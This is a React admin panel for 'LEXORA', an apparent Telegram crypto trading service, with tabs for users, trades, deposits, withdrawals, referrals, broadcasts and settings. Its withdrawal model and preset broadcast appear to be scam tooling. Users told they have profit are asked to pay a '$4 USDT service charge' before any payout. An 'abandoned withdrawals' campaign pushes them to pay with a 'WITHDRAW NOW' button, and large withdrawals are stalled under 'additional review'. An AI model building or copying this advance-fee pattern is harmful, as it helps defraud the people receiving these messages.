import { createFileRoute, Link } from "@tanstack/react-router";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import { useState } from "react";
import {
  createBroadcast,
  getAdminOverview,
  listBroadcastRecipients,
  listBroadcasts,
  previewBroadcastAudience,
  setUserStatus,
  setWithdrawalStatus,
  updateSetting,
} from "@/lib/nexora/admin.functions";

export const Route = createFileRoute("/admin")({
  head: () => ({
    meta: [
      { title: "LEXORA Admin Panel" },
      { name: "description", content: "Manage LEXORA users, trades, withdrawals and settings." },
      { property: "og:title", content: "LEXORA Admin Panel" },
      { property: "og:description", content: "Manage LEXORA users, trades, withdrawals and settings." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: AdminPage,
});

const TABS = [
  "users",
  "trades",
  "deposits",
  "withdrawals",
  "referrals",
  "broadcast",
  "settings",
] as const;
type Tab = (typeof TABS)[number];

const money = (v: unknown) => `$${Number(v ?? 0).toFixed(2)}`;

function AdminPage() {
  const [tab, setTab] = useState<Tab>("users");
  const qc = useQueryClient();
  const { data, isLoading, error } = useQuery({
    queryKey: ["admin-overview"],
    queryFn: () => getAdminOverview(),
    retry: false,
  });

  const refresh = () => qc.invalidateQueries({ queryKey: ["admin-overview"] });
  const wdMutation = useMutation({
    mutationFn: (v: { id: string; status: "pending" | "paid" | "rejected" }) =>
      setWithdrawalStatus({ data: v }),
    onSuccess: refresh,
  });
  const userMutation = useMutation({
    mutationFn: (v: { id: string; status: "active" | "blocked" }) => setUserStatus({ data: v }),
    onSuccess: refresh,
  });
  const settingMutation = useMutation({
    mutationFn: (v: { key: string; value: string }) => updateSetting({ data: v }),
    onSuccess: refresh,
  });

  if (isLoading) return <Shell>Loading…</Shell>;
  if (error)
    return (
      <Shell>
        <p className="mb-4">You need an admin account to view this panel.</p>
        <Link to="/auth" className="rounded-lg bg-primary px-4 py-2 text-primary-foreground">
          Sign in
        </Link>
      </Shell>
    );

  const balanceOf = (id: string) => data!.balances.find((b) => b.user_id === id);
  const userLabel = (id: string) => {
    const u = data!.users.find((x) => x.id === id);
    return u ? (u.username ? `@${u.username}` : String(u.telegram_id)) : id.slice(0, 8);
  };

  const s = data!.stats;

  return (
    <Shell>
      <section className="mb-8 grid grid-cols-2 gap-3 md:grid-cols-4">
        <Stat label="Users (24h)" value={s.users24h} hint="New registrations today" accent />
        <Stat label="Total users" value={s.totalUsers} hint="All time" />
        <Stat label="Users (7d)" value={s.users7d} hint="Last 7 days" />
        <Stat label="Active trades" value={s.activeTrades} hint="Currently running" />
        <Stat label="Pending withdrawals" value={s.pendingWithdrawals} hint="Awaiting action" />
        <Stat label="Total balance" value={money(s.totalBalance)} hint="Across all users" />
        <Stat label="Total profit" value={money(s.totalProfit)} hint="Withdrawable pool" />
        <Stat label="Referrals" value={data!.referrals.length} hint="Recent records" />
      </section>

      <div className="mb-6 flex flex-wrap gap-2">
        {TABS.map((t) => (
          <button
            key={t}
            onClick={() => setTab(t)}
            className={`rounded-lg border border-border px-3 py-2 text-sm capitalize ${
              tab === t ? "bg-primary text-primary-foreground" : ""
            }`}
          >
            {t}
          </button>
        ))}
      </div>


      {tab === "users" && (
        <Table head={["Telegram", "Username", "Registered", "Bonus", "Balance", "Profit", "Refs", "Status", ""]}>
          {data!.users.map((u) => {
            const b = balanceOf(u.id);
            const refs = data!.referrals.filter((r) => r.referrer_id === u.id).length;
            return (
              <tr key={u.id} className="border-t border-border">
                <Td>{u.telegram_id}</Td>
                <Td>{u.username ?? "—"}</Td>
                <Td>{new Date(u.created_at).toLocaleDateString()}</Td>
                <Td>{u.bonus_claimed ? "✅" : "—"}</Td>
                <Td>{money(b?.balance)}</Td>
                <Td>{money(b?.profit)}</Td>
                <Td>{refs}</Td>
                <Td>
                  {u.status}
                  {u.flagged_reason ? ` ⚠️ ${u.flagged_reason}` : ""}
                </Td>
                <Td>
                  <button
                    className="text-xs underline"
                    onClick={() =>
                      userMutation.mutate({
                        id: u.id,
                        status: u.status === "blocked" ? "active" : "blocked",
                      })
                    }
                  >
                    {u.status === "blocked" ? "Unblock" : "Block"}
                  </button>
                </Td>
              </tr>
            );
          })}
        </Table>
      )}

      {tab === "trades" && (
        <Table head={["User", "Pair", "Dir", "Amount", "Entry", "TP", "SL", "Dur", "Result", "P/L", "When"]}>
          {data!.trades.map((t) => (
            <tr key={t.id} className="border-t border-border">
              <Td>{userLabel(t.user_id)}</Td>
              <Td>{t.symbol}</Td>
              <Td>{t.direction}</Td>
              <Td>{money(t.amount)}</Td>
              <Td>{t.entry_price}</Td>
              <Td>{t.take_profit}</Td>
              <Td>{t.stop_loss}</Td>
              <Td>{t.duration_minutes}m</Td>
              <Td>{t.result ?? t.status}</Td>
              <Td>{t.pnl == null ? "—" : money(t.pnl)}</Td>
              <Td>{new Date(t.opened_at).toLocaleString()}</Td>
            </tr>
          ))}
        </Table>
      )}

      {tab === "withdrawals" && (
        <Table head={["User", "Amount", "Wallet", "Network", "Fee", "Fee status", "Status", "When", ""]}>
          {data!.withdrawals.map((w) => (
            <tr key={w.id} className="border-t border-border">
              <Td>{userLabel(w.user_id)}</Td>
              <Td>{money(w.amount)}</Td>
              <Td className="max-w-[160px] truncate">{w.wallet_address}</Td>
              <Td>{w.network}</Td>
              <Td>{Number(w.service_fee_amount ?? 0) > 0 ? money(w.service_fee_amount) : "—"}</Td>
              <Td className="max-w-[140px] truncate">
                {w.service_fee_status}
                {w.service_fee_tx ? ` · ${String(w.service_fee_tx).slice(0, 8)}…` : ""}
              </Td>
              <Td>{w.status}</Td>
              <Td>{new Date(w.created_at).toLocaleString()}</Td>
              <Td>
                <div className="flex gap-2 text-xs underline">
                  <button onClick={() => wdMutation.mutate({ id: w.id, status: "paid" })}>Paid</button>
                  <button onClick={() => wdMutation.mutate({ id: w.id, status: "rejected" })}>
                    Reject
                  </button>
                </div>
              </Td>
            </tr>
          ))}
        </Table>
      )}

      {tab === "deposits" && (
        <Table head={["User", "Requested", "Exact amount", "Status", "Tx", "When"]}>
          {data!.deposits.map((d) => (
            <tr key={d.id} className="border-t border-border">
              <Td>{userLabel(d.user_id)}</Td>
              <Td>{money(d.amount)}</Td>
              <Td>{Number(d.unique_amount).toFixed(2)} USDT</Td>
              <Td>{d.status}</Td>
              <Td className="max-w-[140px] truncate">
                {d.tx_hash ? `${String(d.tx_hash).slice(0, 10)}…` : "—"}
              </Td>
              <Td>{new Date(d.created_at).toLocaleString()}</Td>
            </tr>
          ))}
        </Table>
      )}


      {tab === "referrals" && (
        <Table head={["Referrer", "Referred", "Status", "Reward", "Qualified"]}>
          {data!.referrals.map((r) => (
            <tr key={r.id} className="border-t border-border">
              <Td>{userLabel(r.referrer_id)}</Td>
              <Td>{userLabel(r.referred_id)}</Td>
              <Td>{r.status}</Td>
              <Td>{money(r.reward_amount)}</Td>
              <Td>{r.qualified_at ? new Date(r.qualified_at).toLocaleDateString() : "—"}</Td>
            </tr>
          ))}
        </Table>
      )}

      {tab === "broadcast" && <BroadcastTab />}

      {tab === "settings" && (
        <div className="space-y-3">
          {data!.settings.map((s) => (
            <SettingRow
              key={s.key}
              settingKey={s.key}
              value={JSON.stringify(s.value)}
              onSave={(value) => settingMutation.mutate({ key: s.key, value })}
            />
          ))}
          {settingMutation.error && (
            <p className="text-sm text-destructive">{(settingMutation.error as Error).message}</p>
          )}
        </div>
      )}
    </Shell>
  );
}

const AUDIENCE_OPTIONS = [
  { id: "abandoned_withdrawals", label: "Abandoned withdrawals" },
  { id: "all", label: "All users" },
  { id: "has_profit", label: "Has withdrawable profit" },
  { id: "never_traded", label: "Never traded" },
  { id: "inactive", label: "Inactive (no trade in N days)" },
] as const;

const MEDIA_OPTIONS = [
  { id: "none", label: "No media" },
  { id: "withdraw-recovery", label: "Withdrawal recovery video" },
] as const;

const ACTION_OPTIONS = [
  { id: "", label: "No button" },
  { id: "wd", label: "💸 WITHDRAW NOW" },
  { id: "trade", label: "🚀 START TRADING" },
  { id: "deposit", label: "💳 DEPOSIT" },
  { id: "wallet", label: "💰 WALLET" },
  { id: "invite", label: "👥 INVITE & EARN" },
  { id: "home", label: "🏠 OPEN MENU" },
] as const;

const RECOVERY_BODY = `💸 YOUR PROFIT IS STILL WAITING

Your withdrawal request was never completed, so your profit was returned to your balance — it is still yours.

You can restart your withdrawal right now:
1. Tap the button below
2. Send your USDT TRC-20 wallet address
3. Pay the one-time $4 USDT service charge (copy buttons provided)
4. Your profit is sent once the payment is confirmed on-chain

⚠️ Withdrawals above $5,000 go through an additional review before being fulfilled.`;

function BroadcastTab() {
  const qc = useQueryClient();
  const [audience, setAudience] = useState<string>("abandoned_withdrawals");
  const [days, setDays] = useState(7);
  const [mediaId, setMediaId] = useState<string>("withdraw-recovery");
  const [body, setBody] = useState(RECOVERY_BODY);
  const [action, setAction] = useState<string>("wd");
  const [actionText, setActionText] = useState("💸 WITHDRAW NOW");
  const [openId, setOpenId] = useState<string | null>(null);

  const history = useQuery({
    queryKey: ["admin-broadcasts"],
    queryFn: () => listBroadcasts(),
    retry: false,
    refetchInterval: 15000,
  });

  const preview = useMutation({
    mutationFn: () =>
      previewBroadcastAudience({
        data: audience === "inactive" ? { audience: audience as never, days } : { audience: audience as never },
      }),
  });

  const send = useMutation({
    mutationFn: () =>
      createBroadcast({
        data: {
          body,
          mediaId,
          audience: audience as never,
          buttons: action ? [{ text: actionText || "OPEN", action }] : [],
          ...(audience === "inactive" ? { days } : {}),
        },
      }),
    onSuccess: () => qc.invalidateQueries({ queryKey: ["admin-broadcasts"] }),
  });

  return (
    <div className="space-y-8">
      <div className="grid gap-4 md:grid-cols-2">
        <div className="space-y-4">
          <Field label="Audience">
            <select
              className="w-full rounded-lg border border-border bg-card px-3 py-2 text-sm"
              value={audience}
              onChange={(e) => setAudience(e.target.value)}
            >
              {AUDIENCE_OPTIONS.map((a) => (
                <option key={a.id} value={a.id}>
                  {a.label}
                </option>
              ))}
            </select>
          </Field>

          {audience === "inactive" && (
            <Field label="Inactive for (days)">
              <input
                type="number"
                min={1}
                className="w-full rounded-lg border border-border bg-card px-3 py-2 text-sm"
                value={days}
                onChange={(e) => setDays(Number(e.target.value) || 7)}
              />
            </Field>
          )}

          <Field label="Media">
            <select
              className="w-full rounded-lg border border-border bg-card px-3 py-2 text-sm"
              value={mediaId}
              onChange={(e) => setMediaId(e.target.value)}
            >
              {MEDIA_OPTIONS.map((m) => (
                <option key={m.id} value={m.id}>
                  {m.label}
                </option>
              ))}
            </select>
          </Field>

          <Field label="Button">
            <div className="flex gap-2">
              <select
                className="w-1/2 rounded-lg border border-border bg-card px-3 py-2 text-sm"
                value={action}
                onChange={(e) => {
                  setAction(e.target.value);
                  const found = ACTION_OPTIONS.find((a) => a.id === e.target.value);
                  if (found && found.id) setActionText(found.label);
                }}
              >
                {ACTION_OPTIONS.map((a) => (
                  <option key={a.id} value={a.id}>
                    {a.label}
                  </option>
                ))}
              </select>
              <input
                className="w-1/2 rounded-lg border border-border bg-card px-3 py-2 text-sm"
                value={actionText}
                onChange={(e) => setActionText(e.target.value)}
                placeholder="Button label"
              />
            </div>
          </Field>
        </div>

        <Field label="Message">
          <textarea
            rows={14}
            className="w-full rounded-lg border border-border bg-card px-3 py-2 text-sm"
            value={body}
            onChange={(e) => setBody(e.target.value)}
          />
        </Field>
      </div>

      <div className="flex flex-wrap items-center gap-3">
        <button
          onClick={() => preview.mutate()}
          className="rounded-lg border border-border px-4 py-2 text-sm"
        >
          {preview.isPending ? "Counting…" : "Preview recipients"}
        </button>
        {preview.data && (
          <span className="text-sm text-muted-foreground">
            {preview.data.count} recipient(s)
          </span>
        )}
        <button
          onClick={() => {
            if (confirm("Send this broadcast now?")) send.mutate();
          }}
          disabled={send.isPending || !body.trim()}
          className="rounded-lg bg-primary px-4 py-2 text-sm text-primary-foreground disabled:opacity-50"
        >
          {send.isPending ? "Queuing…" : "Send broadcast"}
        </button>
        {send.data && (
          <span className="text-sm text-muted-foreground">
            Queued for {send.data.total} user(s) — delivery runs in the background.
          </span>
        )}
        {(send.error || preview.error) && (
          <span className="text-sm text-destructive">
            {((send.error ?? preview.error) as Error).message}
          </span>
        )}
      </div>

      <div>
        <h2 className="mb-3 text-sm uppercase tracking-wide text-muted-foreground">History</h2>
        <Table head={["When", "Audience", "Media", "Status", "Total", "Sent", "Failed", "Message", ""]}>
          {(history.data ?? []).map((b) => (
            <tr key={b.id} className="border-t border-border">
              <Td>{new Date(b.created_at).toLocaleString()}</Td>
              <Td>{b.audience}</Td>
              <Td>{b.media_type}</Td>
              <Td>{b.status}</Td>
              <Td>{b.total_count}</Td>
              <Td>{b.sent_count}</Td>
              <Td>{b.failed_count}</Td>
              <Td className="max-w-[220px] truncate">{b.body}</Td>
              <Td>
                <button
                  className="text-xs underline"
                  onClick={() => setOpenId(openId === b.id ? null : b.id)}
                >
                  {openId === b.id ? "Hide chats" : "View chats"}
                </button>
              </Td>
            </tr>
          ))}
        </Table>
        {openId && <BroadcastChats broadcastId={openId} />}
      </div>
    </div>
  );
}

function BroadcastChats({ broadcastId }: { broadcastId: string }) {
  const { data, isLoading, error } = useQuery({
    queryKey: ["broadcast-recipients", broadcastId],
    queryFn: () => listBroadcastRecipients({ data: { broadcastId } }),
    retry: false,
    refetchInterval: 10000,
  });

  if (isLoading) return <p className="mt-4 text-sm text-muted-foreground">Loading chats…</p>;
  if (error) return <p className="mt-4 text-sm text-destructive">{(error as Error).message}</p>;

  const rows = data ?? [];
  const count = (s: string) => rows.filter((r) => r.status === s).length;

  return (
    <div className="mt-4">
      <p className="mb-2 text-xs text-muted-foreground">
        {rows.length} chat(s) · sent {count("sent")} · pending {count("pending")} · failed{" "}
        {count("failed")} · blocked {count("blocked")}
      </p>
      <Table head={["Chat ID", "Username", "Status", "Delivered at", "Error"]}>
        {rows.map((r) => (
          <tr key={r.id} className="border-t border-border">
            <Td className="tabular-nums">{r.telegram_id}</Td>
            <Td>{r.username ? `@${r.username}` : "—"}</Td>
            <Td>
              {r.status === "sent"
                ? "✅ delivered"
                : r.status === "pending"
                  ? "⏳ pending"
                  : r.status === "blocked"
                    ? "🚫 blocked bot"
                    : "❌ failed"}
            </Td>
            <Td>{r.sent_at ? new Date(r.sent_at).toLocaleString() : "—"}</Td>
            <Td className="max-w-[220px] truncate">{r.error ?? "—"}</Td>
          </tr>
        ))}
      </Table>
    </div>
  );
}

function Field({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <label className="block">
      <span className="mb-1 block text-xs uppercase tracking-wide text-muted-foreground">
        {label}
      </span>
      {children}
    </label>
  );
}

function SettingRow({
  settingKey,
  value,
  onSave,
}: {
  settingKey: string;
  value: string;
  onSave: (v: string) => void;
}) {
  const [v, setV] = useState(value);
  return (
    <div className="flex items-center gap-3">
      <span className="w-56 shrink-0 text-sm text-muted-foreground">{settingKey}</span>
      <input
        className="flex-1 rounded-lg border border-border bg-card px-3 py-2 text-sm"
        value={v}
        onChange={(e) => setV(e.target.value)}
      />
      <button
        onClick={() => onSave(v)}
        className="rounded-lg bg-primary px-3 py-2 text-sm text-primary-foreground"
      >
        Save
      </button>
    </div>
  );
}

function Stat({
  label,
  value,
  hint,
  accent = false,
}: {
  label: string;
  value: React.ReactNode;
  hint?: string;
  accent?: boolean;
}) {
  return (
    <div
      className={`rounded-xl border p-4 ${
        accent ? "border-primary/40 bg-primary/10" : "border-border bg-card"
      }`}
    >
      <p className="text-xs uppercase tracking-wide text-muted-foreground">{label}</p>
      <p className="mt-1 text-2xl font-semibold tabular-nums">{value}</p>
      {hint && <p className="mt-1 text-xs text-muted-foreground">{hint}</p>}
    </div>
  );
}


function Shell({ children }: { children: React.ReactNode }) {
  return (
    <main className="min-h-screen bg-background px-6 py-10 text-foreground">
      <h1 className="mb-6 text-2xl font-bold">LEXORA Admin</h1>
      {children}
    </main>
  );
}

function Table({ head, children }: { head: string[]; children: React.ReactNode }) {
  return (
    <div className="overflow-x-auto rounded-xl border border-border">
      <table className="w-full text-left text-sm">
        <thead className="bg-card text-muted-foreground">
          <tr>
            {head.map((h, i) => (
              <th key={i} className="px-3 py-2 font-medium">
                {h}
              </th>
            ))}
          </tr>
        </thead>
        <tbody>{children}</tbody>
      </table>
    </div>
  );
}

function Td({ children, className = "" }: { children: React.ReactNode; className?: string }) {
  return <td className={`px-3 py-2 ${className}`}>{children}</td>;
}
